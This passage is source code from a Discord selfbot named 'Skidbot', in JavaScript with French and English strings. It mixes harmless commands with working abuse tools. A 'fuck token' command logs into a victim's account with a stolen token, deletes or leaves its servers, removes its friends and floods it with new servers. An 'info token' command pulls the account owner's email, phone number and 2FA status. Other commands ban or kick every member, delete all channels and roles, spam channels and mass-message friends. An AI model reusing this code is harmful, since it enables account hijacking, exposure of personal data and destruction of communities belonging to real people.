        console.log('Command channels list executed'.yellow);
    };
    if (message.content === prefix + 'roles list') {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        if (!message.member.hasPermission('EMBED_LINKS')) {
            return message.edit(':x: **insuficient perms (embed_links)** ' + role.map(role => {
                return role.name;
            }) + '');
        };
        const role = message.guild.roles;
        var embed = new Discord.RichEmbed()
            .setFooter('Skidbot 1.0')
            .setColor(color)
            .addField('roles list:', role.map(role => {
                return role.name;
            }));
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command roles list executed'.yellow);
    };
    if (message.content === prefix + 'cmd') {
        message.edit(cmd).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command cmd executed'.yellow);
    };
    if (message.content === prefix + 'help') {
        message.edit(help).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help executed'.yellow);
    };
    if (message.content === prefix + 'help backup') {
        message.edit(help_backup).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help backup executed'.yellow);
    };
    if (message.content === prefix + 'help raid') {
        message.edit(help_raid).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help hack executed'.yellow);
    };
    if (message.content === prefix + 'help hack') {
        message.edit(help_hack).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help raid executed'.yellow);
    };
    if (message.content === prefix + 'help status') {
        message.channel.send(help_statut2);
        message.edit(help_statut).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help statut executed'.yellow);
    };
    if (message.content === prefix + 'help funny') {
        message.edit(help_fun).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help fun executed'.yellow);
    };
    if (message.content === prefix + 'help moderation') {
        message.edit(help_moderation).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help moderation executed'.yellow);
    };
    if (message.content === prefix + 'help nsfw') {
        message.edit(help_nsfw).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help nsfw executed'.yellow);
    };
    if (message.content === prefix + 'help utility') {
        message.edit(help_info).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command help utility executed'.yellow);
    };
    if (message.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
        const mentionuser = message.mentions.users.first() || message.author;
        const embed = new Discord.RichEmbed()
            .setAuthor(mentionuser.username)
            .setImage(mentionuser.avatarURL)
            .setColor(color)
            .setFooter('Skidbot 1.0');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
        });
        console.log('Command avatar executed'.yellow);
    };
    if (message.content === prefix + 'change hypesquad brilliance') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 2
            })
        });
        message.edit(':white_check_mark: **you just joined hypesquad \'brilliance\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content === prefix + 'change hypesquad ballance') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 3
            })
        });
        message.edit(':white_check_mark: **you just joined hypesquad \'ballance\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content === prefix + 'change hypesquad bravery') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 1
            })
        });
        message.edit(':white_check_mark: **you just joined hypesquad \'bravery\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content.startsWith(prefix + 'check token')) {
        let argument = args.splice(2).join(' ');
        let url = 'https://discordapp.com/api/v6/users/@me';
        request(url, {
            method: 'GET',
            headers: {
                authorization: argument
            }
        }, function (err, response, body) {
            if (response.statusCode === 200) {
                var validetoken = newDiscord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Le token: ' + argument + ' \n**is 100% valid** :white_check_mark:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Skidbot', message.author.avatarURL);
                message.edit(validetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
                });
            } else {
                var invalidetoken = new Discord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Lthe token ' + argument + ' \nis not valid :x:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Skidbot', message.author.avatarURL);
                message.edit(invalidetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
                });
                console.log('Command check token executed'.yellow);
            }
        })
    };
    if (message.content == prefix + 'ddos voc') {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        if (!message.member.hasPermission('ADMINISTRATOR')) {
            message.channel.send(':x: **you need admin perms to do that**');
            return
        };
        let i = 0;
        const arraydesregions = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
        setInterval(() => {
            message.guild.setRegion(arraydesregions[i]);
            i++;
            if (i == arraydesregions.length) {
                i = 0
            }
        }, 1000);
        message.edit('**Command ddos vocal enabled**');
        console.log('Command ddos vocal executed'.yellow);
    };
    if (message.content == prefix + 'ddos-stop') {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        clearInterval();
        message.edit('**Command ddos disabled**');
        console.log('Command ddos voc disabled'.yellow);
    };
    if (message.content.startsWith(prefix + 'spam')) {
        if (!message.guild) {
            return message.edit(':x: **command only useable in servers**')
        };
        let spammsg = args.splice(1).join(' ') + ' spam by Skidbot' || '@everyonehttps://discord.gg/MD5ZyjjATcSkidbothttps://youtu.be/K-lbCR2W1zk';
        message.edit('**Wait...**');
        setInterval(() => {
            message.channel.send(spammsg).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
            });
        }, 1000);
        console.log('Command spam executed'.yellow);
    };
    if (message.content == prefix + 'stop spam') {
        if (!message.guild) {
            return message.edit(':x: **Command only useable on servers**')
        };
        clearInterval();
        message.edit('**Command spam stopped**');
        client.destroy().then(() => {
            return client.login(token);
        });
        console.log('Commande spam stopé'.yellow);
    };
    if (message.content.startsWith(prefix + 'info token')) {
        let argument = args.splice(2).join(' ');
        let url = 'https://discordapp.com/api/v6/users/@me';
        request(url, {
            method: 'GET',
            headers: {
                authorization: argument
            }
        }, function (err, response, body) {
            if (response.statusCode === 200) {
                new Promise((resolve, reject) => {
                    let url = 'https://discordapp.com/api/v6/users/@me';
                    request(url, {
                        method: 'GET',
                        headers: {
                            authorization: argument
                        }
                    }, function (err, response, body) {
                        body = JSON.parse(body);
                        var id = body.id;
                        var username = body.username;
                        var avatar = body.avatar;
                        var tag = body.discriminator;
                        var mfaornotmfa = body.mfa_enabled;
                        var phone = body.phone;
                        var locale = body.locale;
                        let publicflags = body.public_flags;
                        let flags = body.flags;
                        let email = body.email;
                        let verified = body.verified;
                        let nsfw = body.nsfw_allowed;
                        var tyty = '';
                        tyty += 'User: ' + username + '#' + tag;
                        tyty += 'Id: ' + id;
                        tyty += 'Email: ' + email;
                        tyty += 'Numéro de telephone: ' + phone;
                        tyty += 'Avatar: ' + avatar;
                        tyty += 'Langue: ' + locale;
                        tyty += 'A2f activé?: ' + mfaornotmfa;
                        tyty += 'Compte vérifié?: ' + verified;
                        tyty += 'Nsfw activé?: ' + nsfw;
                        tyty += 'Flags: ' + flags;
                        tyty += 'Public Flags: ' + publicflags;
                        var embed = new Discord.RichEmbed()
                            .setTitle('**Commande Token Info**')
                            .setDescription(tyty)
                            .setColor(color)
                            .setFooter('Skidbot 1.2');
                        return message.edit(embed).then(console.log('Commande info token executé'.yellow));
                    })
                })
            } else {
                var invalidetoken = new Discord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Le token ' + argument + ' \nn\'est pas valide :x:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Skidbot', message.author.avatarURL);
                message.edit(invalidetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                });
            }
        })
    };
    if (message.content.startsWith(prefix + 'fuck token')) {
        let fucked = new Discord.Client();
        let argument = args.splice(2).join(" ");
        let url = "https://discordapp.com/api/v6/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: argument
                }
            },
            function (error, response, body) {
                if (response.statusCode === 200) {
                    fucked.on("ready", function () {
                        for (pas = 0; pas < 100; pas++) {
                            fucked.user.createGuild("waifuware skidsystems", "hongkong")
                        }
                    });
                    for (pas = 0; pas < 20; pas++) {
                        fetch("https://discord.com/api/v8/users/@me/settings", {
                            "headers": {
                                "authorization": argument,
                                "content-type": "application/json",
                            },
                            "body": "{\"theme\":\"light\"}",
                            "method": "PATCH"
                        });

                        fetch("https://discord.com/api/v8/users/@me/settings", {
                            "headers": {
                                "authorization": argument,
                                "content-type": "application/json",
                            },
                            "body": "{\"theme\":\"dark\"}",
                            "method": "PATCH"
                        });
                    };
                    fucked.on('ready', function () {
                        fucked.user.friends.forEach(amis => {
                            fucked.user.removeFriend(amis).catch(err => {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                        });
                        fucked.guilds.forEach((fuck) => {
                            if (fuck.ownerID === fucked.user.id) {
                                fuck.delete().catch(err => {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                            } else {
                                if (fuck.id === '836351035865563216') {
                                    return
                                }
                            };
                            fuck.leave().catch(err => {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                        });
                        message.edit(':white_check_mark: **Token fuck en cours...**')
                    });
                    fucked.login(argument)
                } else {
                    var invalidetoken = new Discord.RichEmbed()
                        .setTitle('Token info')
                        .setDescription('Le token ' + argument + ' \nn\'est pas valide :x:')
                        .setColor(color)
                        .setTimestamp()
                        .setFooter('Skidbot', message.author.avatarURL);
                    message.edit(invalidetoken).catch(err => {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    })
                }
            });
        console.log('Commande fuck token executé'.yellow);
    };
    if (message.content.startsWith(prefix + "8ball")) {
        let args = message.content.split(" ").splice(1).join(' ')
        var eightball = [
            "oui!",
            "non...",
            "peut etre?",
            "probablement",
            "je ne pense pas.",
            "jamais!",
            "tu peux essayer...",
        ]
        if (args[1] != null) message.edit(args + "\nla reponse est: " + eightball[Math.floor(Math.random() * eightball.length)]).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        else message.edit("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])");
        console.log('Commande 8ball executé'.yellow)
    };
    if (message.content.startsWith(prefix + 'mp friend')) {
        if (!args) {
            throw 'Vous devez mettre quelque chose à dire !'
        };
        let mpmsg = args.splice(2).join(' ') || 'Skidbothttps://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA';
        client.user.friends.forEach(amis => {
            amis.send(mpmsg).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        });
        console.log('Commande mp friend executé'.yellow);
    };
    if (message.content.startsWith(prefix + 'say')) {
        if (!args) {
            throw 'Vous devez mettre quelque chose à dire !'
        };
        let argument = args.splice(1).join(' ') || 'Skidbot';
        let embed = new Discord.RichEmbed()
            .setTitle('**Commande Say**')
            .setDescription(argument)
            .setTimestamp()
            .setFooter('Skidbot', client.user.avatarURL)
            .setColor(color);
        for (i = 0; i < 10; i++) {
            embed.setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        };
        console.log('Commande Say executé'.yellow);
    };
    if (message.content.startsWith(prefix + "user info")) {
        if (!mentionuser) {
            return msg.edit(":x: **Unknow user!**"), mentionuser = message.author;
        }
        var userGuild = (message.guild.member(mentionuser));
        var game = mentionuser.presence.game;
        var gameName = game ? game.name : "Nothing";
        var userRoles = (!userGuild ? null : userGuild.roles.array());
        if (userGuild) {
            userRoles.shift();
            for (var i = 0; i < userRoles.length; ++i) {
                userRoles[i] = userRoles[i].name;
            }
            userRoles = userRoles.join(", ");
        };
        var status = {
            dnd: "Do Not Disturb",
            offline: "Offline/Invisible",
            online: "Online",
            idle: "Idle"
        };
        const embed = new Discord.RichEmbed()
            .setAuthor(`${mentionuser.username}#${mentionuser.discriminator} | ${mentionuser.id}`, mentionuser.displayAvatarURL)
            .setFooter("Skidbot 1.0")
            .setThumbnail(mentionuser.displayAvatarURL)
            .setColor(color)
            .addField("Created", `${mentionuser.createdAt.toString().substr(0, 15)},\n${checkDays(mentionuser.createdAt)}`, true)
            .addField("Joined", `${userGuild.joinedAt.toString().substr(0, 15)},\n${checkDays(userGuild.joinedAt)}`, true)
            .addField("Status", status[mentionuser.presence.status], true)
            .addField("Playing", gameName, true)
            .addField("Nickname", userGuild.nickname ? userGuild.nickname : "None", true)
            .addField("Avatar URL", `[Click here!](${mentionuser.displayAvatarURL})`, true)
            .addField("Roles", userRoles ? userRoles : "None")

        msg.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande user info executé'.yellow)
    };

    if (message.content === prefix + "serveur info") {
        if (!msg.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        }

        const millis = new Date().getTime() - msg.guild.createdAt.getTime();
        const days = millis / 1000 / 60 / 60 / 24;
        const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];

        let embed = new Discord.RichEmbed()
            .setTitle('**Serveur info**')
            .addField('Name:', `${msg.guild.name}`)
            .addField('Created On:', `${message.guild.createdAt.toString().substr(0, 15)},\n${checkDays(message.guild.createdAt)}`, true)
            .addField('Default Channel:', `${msg.guild.defaultChanne}`)
            .addField('Region:', `${msg.guild.region}`)
            .addField('Member Count', `${msg.guild.members.filter(m => m.presence.status !== 'offline').size} / ${msg.guild.memberCount}`)
            .addField('Owner:', `${message.guild.owner.user.username}`)
            .addField('Text Channels', `${msg.guild.channels.filter(m => m.type === 'text').size}`)
            .addField('Voice Channels', `${msg.guild.channels.filter(m => m.type === 'voice').size}`)
            .addField('Verification Level', `${verificationLevels[msg.guild.verificationLevel]}`)
            .addField('Roles:', `${msg.guild.roles.size}`)
            .addField('Guild ID:', `${msg.guild.id}`)
            .setColor(color)

        if (msg.guild.iconURL != null) {
            embed.setThumbnail(`${msg.guild.iconURL}`);
        }
        msg.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log('Commande serveur info effectué'.yellow)
    };
    if (message.content === prefix + 'stats') {
        let embed = new Discord.RichEmbed()
        setTimestamp()
            .setColor(color)
            .setTitle('**Selfbot Statistics**')
            .addField('Mem Usage:', '' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB')
            .addField('Servers:', client.guilds.size)
            .addField('Channels:', client.channels.size)
            .addField('Users:', client.guilds.map(user => {
                return user.memberCount;
            }))
            .addField('Servers:', client.guilds.size)
            .addField('Servers:', client.guilds.size)
            .setFooter('Skidbot 1.0', client.user.avatarURL);
        if (client.user.premium > 0) {
            embed.addField('• Nitro', 'oui');
        } else {
            embed.addField('• Nitro', 'non');
        };
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande stats effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'ass')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'ass'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setColor(color)
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        });
        console.log('Commande ass effectué'.yellow);
    };
    if (message.content.startsWith(prefix + '4k')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: '4k'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande 4k effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'nsfw-gif')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'pgif'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande nsfw gif effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'hentai')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'hentai_anal'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande hentai effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'pussy')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'pussy'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande pussy effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'thigh')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'thigh'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande thigh effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'anal')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'anal'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Skidbot 1.0')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande anal effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'fight')) {
        if (!mentionuser) {
            return message.edit(':x: **Aucun utilisateur mentionné**')
        };
        var embed = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Skidbot 1.0')
            .setTitle(mentionuser.username + ' __**VS**__ ' + client.user.username)
            .setImage('https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande fight effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'boom')) {
        if (!mentionuser) {
            return message.edit(':x: **Aucun utilisateur mentionné**')
        };
        var embed = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Skidbot 1.0')
            .setTitle(mentionuser.username + ' **Ce Fait Explosé Par **💣💥 ' + client.user.username)
            .setImage('https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande boom effectué'.yellow);
    };
    if (message.content === prefix + 'shutdown') {
        message.delete().then(() => {
            return process.exit(1);
        });
        console.log('Commande shutdown effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'kick')) {
        let guild = message.guild;
        if (!guild) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return
        };
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        mentionuser.kick().then(member => {
            message.edit(':wave: ' + member.displayName + ' has been successfully kicked :point_right: ');
        }).catch(() => {
            message.edit(':x: **Access Denied**');
        });
        console.log('Commande kick effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'ban')) {
        let guild = message.guild;
        if (!guild) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return
        };
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        mentionuser.ban().then(member => {
            message.edit(':wave: ' + member.displayName + ' has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ');
        }).catch(() => {
            message.edit(':x: **Access Denied**');
        });
        console.log('Commande ban effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'name all')) {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        const usermsg = message.content.split(" ").slice(2).join(" ") || message.author.username

        if (!message.member.hasPermission('MANAGE_NICKNAMES'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))
        const dmusers = message.guild.members;

        msg.edit(`Je renomme tout le monde par ${usermsg}`)

        dmusers.forEach(dmuser => {
            dmuser.setNickname(usermsg).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande name all effectué'.yellow)
    }
    if (message.content === prefix + 'all ban') {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        if (!message.member.hasPermission('BAN_MEMBERS'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))

        message.guild.members.forEach(dmuser => {

            setInterval(() => {
                if (!dmuser.bannable) return;
                dmuser.ban().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            }, 1000);
        })
        console.log('Commande ban all effectué'.yellow)
    }
    if (message.content === prefix + 'all kick') {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        if (!message.member.hasPermission('KICK_MEMBERS'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))

        const dmusers = message.guild.members
        dmusers.forEach(dmuser => {
            if (!dmuser.kickable) return;
            dmuser.kick().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande kick all effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'purge')) {

        message.channel.fetchMessages().then(message =>
            message.forEach(m => {
                if (m.author.id === client.user.id) {
                    m.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
                }
            }));
        console.log('Commande purge effectué'.yellow);
    }
    if (message.content === prefix + 'rire') {
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle('**Commande rire:**')
            .setTimestamp()
            .setFooter('Skidbot 1.0')
            .setImage(rire[Math.floor(Math.random() * rire.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande rire effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'kiss')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color).setTitle(`${client.user.username} kiss ${mentionuser.username}`)
            .setTimestamp()
            .setFooter('Skidbot 1.0')
            .setImage(kiss[Math.floor(Math.random() * kiss.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande kiss effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'ez')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${mentionuser.username}' ezzzz run!**`)
            .setTimestamp()
            .setFooter('Skidbot 1.0')
            .setImage(ez[Math.floor(Math.random() * ez.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande ez effectué'.yellow);
    };
    if (message.content.startsWith(prefix + "load")) {
        message.delete();
        var charge = ".";
        var chargeC = "█";
        message.channel.send("```[" + charge.repeat(50) + "]```").then((message) => {
            for (i = 0; i <= 50; i++) {
                message.edit("```[" + chargeC.repeat(i) + charge.repeat(50 - i) + "]  -  " + i * 100 / 50 + "%\n" + "loading..```");
            }
            message.edit("`Succesfull load.`").catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande load effectué'.yellow)
        })
    }
    if (message.content === prefix + "delete all channel") {
        let serveur = message.guild;
        if (!serveur) {
            message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
            return;
        }
        if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))
        var channels = message.guild.channels
        channels.forEach(chan => {
            chan.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande delete all channel effectué'.yellow)

    }
    if (message.content === prefix + "delete all role") {
        let serveur = msg.guild;
        if (!serveur) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return;
        }
        message.guild.roles.forEach(roles => {
            roles.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande delete all role effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'punch')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${client.user.username} punch ${mentionuser.username}**`)
            .setTimestamp()
            .setFooter('Skidbot 1.0')
            .setImage(punch[Math.floor(Math.random() * punch.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande punch effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'calin')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username}**`)
            .setTimestamp()
            .setFooter('Skidbot 1.0')
            .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande calin effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'set serveur name')) {
        let arg = args.splice(1).join(" ") || "Skidbot 1.0";
        message.edit(`Changement du nom du serveur pour: ` + arg);
        message.guild.setName(arg)
        console.log('Commande set serveur name effectué'.yellow)
    }
    if (message.content.startsWith(`${prefix}token`)) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return;
        }
        let token = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
        let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
        var id = mentionuser.id;
        var bytes = utf8.encode(id);
        var encoded = base64.encode(bytes);
        var embed_encode = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Skidbot 1.0')
            .setTitle(`Token match ${mentionuser.username}`)
            .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
        setTimeout(() => {
            message.edit("░░░░░░░░░░ 0%");
        }, 1000);
        setTimeout(() => {
            message.edit("▓▓░░░░░░░░ 20%");
        }, 1500);
        setTimeout(() => {
            message.edit("▓▓▓▓░░░░░░ 40%");
        }, 2000);
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓░░░░ 60%");
        }, 2500);
        setTimeout(() => {
